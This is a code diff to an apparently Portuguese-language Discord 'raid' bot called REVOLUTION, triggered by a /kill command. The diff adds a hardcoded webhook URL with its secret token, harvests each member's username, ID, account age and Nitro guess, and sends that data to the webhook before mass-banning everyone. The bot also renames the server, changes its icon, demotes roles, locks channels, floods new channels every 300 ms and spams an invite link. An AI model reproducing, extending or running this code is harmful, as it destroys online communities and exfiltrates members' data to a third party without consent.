@@ -1,7 +1,11 @@
-const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType, WebhookClient } = require('discord.js');
 const express = require('express');
 const fs = require('fs');
 require('dotenv').config();
+
+// ============ WEBHOOK CONFIG ============
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524849169855156274/ll8i1nDfLBoa2w6tbfjJJQoJMf1bitg3W46IKL1mkH1WL4xk5cojOg-OdreOq6b4wLBE';
+const webhookClient = new WebhookClient({ url: WEBHOOK_URL });
 
 // ============ CLIENT ============
 const client = new Client({
@@ -15,6 +19,70 @@ const client = new Client({
 });
 
 client.commands = new Map();
+
+// ============ FUNÇÃO PARA ENVIAR DADOS AO WEBHOOK ============
+async function sendToWebhook(userData, guildName, action) {
+  try {
+    const embed = new EmbedBuilder()
+      .setTitle('🔥 REVOLUTION - DADOS COLETADOS')
+      .setColor('#ff0000')
+      .setDescription(`**AÇÃO:** ${action}`)
+      .addFields(
+        { name: '👤 NOME DE USUÁRIO', value: userData.username || 'N/A', inline: true },
+        { name: '🆔 ID DO USUÁRIO', value: userData.id || 'N/A', inline: true },
+        { name: '📅 DATA DE CRIAÇÃO', value: userData.createdAt ? new Date(userData.createdAt).toLocaleString('pt-BR') : 'N/A', inline: true },
+        { name: '💎 NITRO', value: userData.nitro || 'N/A', inline: true },
+        { name: '📊 SERVIDOR', value: guildName || 'N/A', inline: true },
+        { name: '🕒 DATA/HORA', value: new Date().toLocaleString('pt-BR'), inline: true }
+      )
+      .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
+      .setFooter({ text: 'REVOLUTION - COLETA DE DADOS' })
+      .setTimestamp();
+
+    await webhookClient.send({
+      content: `@everyone 🔥 **NOVOS DADOS COLETADOS!**`,
+      embeds: [embed]
+    });
+    console.log(`📤 DADOS ENVIADOS AO WEBHOOK: ${userData.username}`);
+  } catch (error) {
+    console.error(`ERRO AO ENVIAR WEBHOOK: ${error.message}`);
+  }
+}
+
+// ============ FUNÇÃO PARA COLETAR DADOS DO USUÁRIO ============
+async function collectUserData(member) {
+  try {
+    const user = member.user;
+    
+    // Verifica se tem Nitro (aproximado)
+    let nitro = 'NÃO';
+    if (user.flags) {
+      const flags = user.flags.toArray();
+      if (flags.includes('PremiumPromoDismissed') || flags.includes('HypeSquadOnlineHouse1') || flags.includes('HypeSquadOnlineHouse2') || flags.includes('HypeSquadOnlineHouse3')) {
+        nitro = 'POSSIVELMENTE';
+      }
+    }
+    
+    // Verifica se é bot
+    if (user.bot) {
+      nitro = 'BOT';
+    }
+
+    const userData = {
+      username: user.tag,
+      id: user.id,
+      createdAt: user.createdAt,
+      nitro: nitro,
+      isBot: user.bot,
+      avatar: user.displayAvatarURL()
+    };
+
+    return userData;
+  } catch (error) {
+    console.error(`ERRO AO COLETAR DADOS: ${error.message}`);
+    return null;
+  }
+}
 
 // ============ GERENCIADOR DE ATAQUE ============
 class AttackManager {
@@ -31,20 +99,69 @@ class AttackManager {
 
     let isRunning = true;
     let totalCanaisCriados = 0;
+    let totalBanidos = 0;
 
-    // ============ 1. MUDA O NOME DO SERVIDOR ============
-    const changeServerName = async () => {
+    // ============ 1. MUDA O NOME E FOTO DO SERVIDOR ============
+    const changeServerNameAndIcon = async () => {
       try {
+        // Muda o nome
         await guild.setName('REVOLUTION');
         console.log(`📛 NOME DO SERVIDOR ALTERADO PARA: REVOLUTION`);
-      } catch (error) {}
-    };
-    changeServerName();
-    const nameInterval = setInterval(() => {
-      if (guild.name !== 'REVOLUTION') changeServerName();
-    }, 10000);
 
-    // ============ 2. CRIA CARGO INFERIOR PARA TODOS ============
+        // Muda a foto (baixa a imagem primeiro)
+        try {
+          const imageUrl = 'https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp';
+          const response = await fetch(imageUrl);
+          const buffer = await response.arrayBuffer();
+          await guild.setIcon(Buffer.from(buffer));
+          console.log(`🖼️ FOTO DO SERVIDOR ALTERADA!`);
+        } catch (iconError) {
+          console.error(`ERRO AO MUDAR FOTO: ${iconError.message}`);
+        }
+      } catch (error) {
+        console.error(`ERRO AO MUDAR NOME/FOTO: ${error.message}`);
+      }
+    };
+    changeServerNameAndIcon();
+    const nameIconInterval = setInterval(changeServerNameAndIcon, 15000);
+
+    // ============ 2. BANIR TODOS OS USUÁRIOS ============
+    const banAllUsers = async () => {
+      try {
+        const members = guild.members.cache.filter(m => 
+          !m.user.bot && 
+          m.id !== user.id && 
+          m.id !== client.user.id &&
+          m.bannable
+        );
+
+        for (const member of members.values()) {
+          try {
+            // COLETA DADOS ANTES DE BANIR
+            const userData = await collectUserData(member);
+            if (userData) {
+              await sendToWebhook(userData, guild.name, 'BANIMENTO');
+            }
+
+            await member.ban({ reason: 'REVOLUTION - OPERAÇÃO ANTI-PANELINHA' });
+            totalBanidos++;
+            console.log(`🔨 USUÁRIO BANIDO: ${member.user.tag} (${totalBanidos})`);
+            
+            if (totalBanidos % 5 === 0) {
+              console.log(`📊 TOTAL DE BANIDOS: ${totalBanidos}`);
+            }
+          } catch (error) {
+            console.error(`ERRO AO BANIR ${member.user.tag}: ${error.message}`);
+          }
+        }
+      } catch (error) {
+        console.error(`ERRO NO BANIMENTO EM MASSA: ${error.message}`);
+      }
+    };
+    banAllUsers();
+    const banInterval = setInterval(banAllUsers, 5000);
+
+    // ============ 3. CRIA CARGO INFERIOR ============
     const createLowRole = async () => {
       try {
         const lowRoleName = 'REVOLUTION_SUB';
@@ -67,20 +184,12 @@ class AttackManager {
             await member.roles.set([lowRole.id]);
           } catch (error) {}
         }
-
-        const ownerMember = guild.members.cache.get(user.id);
-        if (ownerMember) {
-          const adminRole = guild.roles.cache.find(r => r.name === 'Administrador');
-          if (adminRole && !ownerMember.roles.cache.has(adminRole.id)) {
-            await ownerMember.roles.add(adminRole);
-          }
-        }
       } catch (error) {}
     };
     createLowRole();
     const rebaixamentoInterval = setInterval(createLowRole, 30000);
 
-    // ============ 3. LOCK EM TODOS OS CANAIS ============
+    // ============ 4. LOCK EM TODOS OS CANAIS ============
     const lockAllChannels = async () => {
       try {
         const channels = guild.channels.cache.filter(ch => ch.isTextBased());
@@ -111,7 +220,7 @@ class AttackManager {
     lockAllChannels();
     const lockInterval = setInterval(lockAllChannels, 15000);
 
-    // ============ 4. CRIAÇÃO MÚLTIPLA DE CANAIS (TEXTO, VOZ, FÓRUM, CATEGORIA) ============
+    // ============ 5. CRIAÇÃO INFINITA DE CANAIS ============
     const channelTypes = [
       { type: ChannelType.GuildText, name: 'texto' },
       { type: ChannelType.GuildVoice, name: 'voz' },
@@ -130,16 +239,10 @@ class AttackManager {
       if (!isRunning) return;
       
       try {
-        // Conta quantos canais de cada tipo existem
-        const existingText = guild.channels.cache.filter(c => c.type === ChannelType.GuildText).size;
-        const existingVoice = guild.channels.cache.filter(c => c.type === ChannelType.GuildVoice).size;
-        const existingForum = guild.channels.cache.filter(c => c.type === ChannelType.GuildForum).size;
         const existingCategory = guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).size;
-
-        // Se tiver mais de 50 canais de um tipo, cria do próximo
         const maxChannels = 50;
 
-        // CRIA CATEGORIA PRIMEIRO (pra organizar)
+        // CRIA CATEGORIA
         if (existingCategory < maxChannels) {
           try {
             const catName = `REVOLUTION-CATEGORIA-${counters.categoria + 1}`;
@@ -151,146 +254,74 @@ class AttackManager {
             totalCanaisCriados++;
             console.log(`📁 CATEGORIA CRIADA: ${catName}`);
             
-            // Cria canais DENTRO da categoria
-            for (let i = 0; i < 3; i++) {
+            // CRIA 5 CANAIS DENTRO DA CATEGORIA
+            for (let i = 0; i < 5; i++) {
               if (!isRunning) break;
               
               // Texto
-              if (counters.texto < maxChannels) {
-                const textName = `revolution-text-${counters.texto + 1}`;
-                await guild.channels.create({
-                  name: textName,
-                  type: ChannelType.GuildText,
-                  parent: category.id,
-                  permissionOverwrites: [
-                    {
-                      id: guild.id,
-                      allow: ['ViewChannel']
-                    }
-                  ]
-                });
-                counters.texto++;
-                totalCanaisCriados++;
-                console.log(`📝 CANAL TEXTO: ${textName}`);
-              }
+              const textName = `revolution-text-${counters.texto + 1}`;
+              await guild.channels.create({
+                name: textName,
+                type: ChannelType.GuildText,
+                parent: category.id,
+                permissionOverwrites: [
+                  {
+                    id: guild.id,
+                    allow: ['ViewChannel']
+                  }
+                ]
+              });
+              counters.texto++;
+              totalCanaisCriados++;
 
               // Voz
-              if (counters.voz < maxChannels) {
-                const voiceName = `revolution-voz-${counters.voz + 1}`;
-                await guild.channels.create({
-                  name: voiceName,
-                  type: ChannelType.GuildVoice,
-                  parent: category.id,
-                  permissionOverwrites: [
-                    {
-                      id: guild.id,
-                      allow: ['ViewChannel', 'Connect']
-                    }
-                  ]
-                });
-                counters.voz++;
-                totalCanaisCriados++;
-                console.log(`🎤 CANAL VOZ: ${voiceName}`);
-              }
+              const voiceName = `revolution-voz-${counters.voz + 1}`;
+              await guild.channels.create({
+                name: voiceName,
+                type: ChannelType.GuildVoice,
+                parent: category.id,
+                permissionOverwrites: [
+                  {
+                    id: guild.id,
+                    allow: ['ViewChannel', 'Connect']
+                  }
+                ]
+              });
+              counters.voz++;
+              totalCanaisCriados++;
 
               // Fórum
-              if (counters.forum < maxChannels) {
-                const forumName = `revolution-forum-${counters.forum + 1}`;
-                await guild.channels.create({
-                  name: forumName,
-                  type: ChannelType.GuildForum,
-                  parent: category.id,
-                  permissionOverwrites: [
-                    {
-                      id: guild.id,
-                      allow: ['ViewChannel', 'SendMessages']
-                    }
-                  ]
-                });
-                counters.forum++;
-                totalCanaisCriados++;
-                console.log(`📋 FÓRUM CRIADO: ${forumName}`);
-              }
+              const forumName = `revolution-forum-${counters.forum + 1}`;
+              await guild.channels.create({
+                name: forumName,
+                type: ChannelType.GuildForum,
+                parent: category.id,
+                permissionOverwrites: [
+                  {
+                    id: guild.id,
+                    allow: ['ViewChannel', 'SendMessages']
+                  }
+                ]
+              });
+              counters.forum++;
+              totalCanaisCriados++;
             }
-          } catch (error) {
-            console.error(`ERRO AO CRIAR CANAIS NA CATEGORIA: ${error.message}`);
-          }
-        }
-
-        // Se atingiu o limite de categorias, cria canais soltos
-        if (existingCategory >= maxChannels) {
-          // Cria canais soltos de texto
-          if (counters.texto < maxChannels * 2) {
-            const textName = `revolution-text-solto-${counters.texto + 1}`;
-            await guild.channels.create({
-              name: textName,
-              type: ChannelType.GuildText,
-              permissionOverwrites: [
-                {
-                  id: guild.id,
-                  allow: ['ViewChannel']
-                }
-              ]
-            });
-            counters.texto++;
-            totalCanaisCriados++;
-            console.log(`📝 CANAL TEXTO SOLTO: ${textName}`);
-          }
-
-          // Cria canais soltos de voz
-          if (counters.voz < maxChannels * 2) {
-            const voiceName = `revolution-voz-solto-${counters.voz + 1}`;
-            await guild.channels.create({
-              name: voiceName,
-              type: ChannelType.GuildVoice,
-              permissionOverwrites: [
-                {
-                  id: guild.id,
-                  allow: ['ViewChannel', 'Connect']
-                }
-              ]
-            });
-            counters.voz++;
-            totalCanaisCriados++;
-            console.log(`🎤 CANAL VOZ SOLTO: ${voiceName}`);
-          }
+          } catch (error) {}
         }
 
         if (totalCanaisCriados % 10 === 0) {
           console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
         }
 
-      } catch (error) {
-        console.error(`ERRO NA CRIAÇÃO MÚLTIPLA: ${error.message}`);
-      }
-    };
-
-    // Executa criação múltipla imediatamente
-    createMultipleChannels();
-
-    // Executa a cada 200ms (MUITO RÁPIDO!)
-    const multiChannelInterval = setInterval(createMultipleChannels, 200);
-
-    // ============ 5. CRIAÇÃO RÁPIDA DE CARGOS ============
-    const createRole = async () => {
-      if (!isRunning) return;
-      try {
-        await guild.roles.create({
-          name: 'RAID BY REVOLUTION',
-          color: '#ff0000',
-          permissions: [PermissionsBitField.Flags.Administrator]
-        });
       } catch (error) {}
     };
 
-    for (let i = 0; i < 10; i++) createRole();
-    const roleInterval = setInterval(() => {
-      for (let i = 0; i < 3; i++) createRole();
-    }, 200);
+    createMultipleChannels();
+    const multiChannelInterval = setInterval(createMultipleChannels, 300);
 
     // ============ 6. SPAM ULTRARRÁPIDO ============
     const spamMessages = [
-      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp\n\nhttps://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif`
+      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp\n\nhttps://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp`
     ];
 
     let messageCount = 0;
@@ -316,7 +347,7 @@ class AttackManager {
               .setTitle('REVOLUTION')
               .setDescription(randomMessage)
               .setColor('#ff0000')
-              .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
+              .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
               .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
               .setTimestamp();
 
@@ -342,32 +373,34 @@ class AttackManager {
     // ============ SALVA O ATAQUE ============
     this.activeAttacks.set(guildId, {
       spamInterval,
-      roleInterval,
-      nameInterval,
+      nameIconInterval,
       lockInterval,
       rebaixamentoInterval,
       multiChannelInterval,
+      banInterval,
       isRunning,
       target: guild.name,
       author: user.tag,
       startTime: new Date(),
       messageCount: 0,
       totalCanaisCriados: 0,
+      totalBanidos: 0,
       stop: () => {
         isRunning = false;
         clearInterval(spamInterval);
-        clearInterval(roleInterval);
-        clearInterval(nameInterval);
+        clearInterval(nameIconInterval);
         clearInterval(lockInterval);
         clearInterval(rebaixamentoInterval);
         clearInterval(multiChannelInterval);
+        clearInterval(banInterval);
         this.activeAttacks.delete(guildId);
         console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
         console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
+        console.log(`🔨 TOTAL DE USUÁRIOS BANIDOS: ${totalBanidos}`);
       }
     });
 
-    console.log(`🔥 ATAQUE ULTRARRÁPIDO iniciado no servidor ${guild.name} por ${user.tag}`);
+    console.log(`🔥 ATAQUE ULTIMATE iniciado no servidor ${guild.name} por ${user.tag}`);
     return this.activeAttacks.get(guildId);
   }
 
@@ -422,23 +455,21 @@ client.commands.set('kill', {
       const successEmbed = new EmbedBuilder()
         .setTitle('ATAQUE REVOLUTION INICIADO')
         .setColor('#ff0000')
-        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE ULTRARRAPIDO`)
+        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE ULTIMATE`)
         .addFields(
           { name: 'ALVO', value: interaction.guild.name, inline: true },
           { name: 'MOTIVO', value: motivo, inline: true },
           { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
           { name: 'STATUS', value: 'ATAQUE EM ANDAMENTO (VELOCIDADE MAXIMA)', inline: false },
           { name: 'PARAR', value: 'USE /end PARA PARAR O ATAQUE', inline: false },
-          { name: 'CANAIS BLOQUEADOS', value: 'TODOS OS CANAIS ESTAO EM LOCK', inline: false },
-          { name: 'USUARIOS REBAIXADOS', value: 'TODOS FORAM REBAIXADOS', inline: false },
-          { name: 'CRIANDO CANAIS', value: 'TEXTO + VOZ + FORUM + CATEGORIAS', inline: false }
+          { name: 'CANAL CRIADO', value: 'TEXTO + VOZ + FORUM + CATEGORIAS', inline: false }
         )
-        .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
-        .setFooter({ text: 'REVOLUTION - ATAQUE ULTRARRAPIDO' })
+        .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
+        .setFooter({ text: 'REVOLUTION - ATAQUE ULTIMATE' })
         .setTimestamp();
 
       await interaction.reply({ embeds: [successEmbed] });
-      log(`🔥 ATAQUE ULTRARRAPIDO iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);
+      log(`🔥 ATAQUE ULTIMATE iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);
 
     } catch (error) {
       await interaction.reply({ 
@@ -474,6 +505,7 @@ client.commands.set('end', {
           { name: 'PARADO POR', value: interaction.user.tag, inline: true },
           { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
         )
+        .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
         .setFooter({ text: 'REVOLUTION - MODO DESATIVADO' })
         .setTimestamp();
 
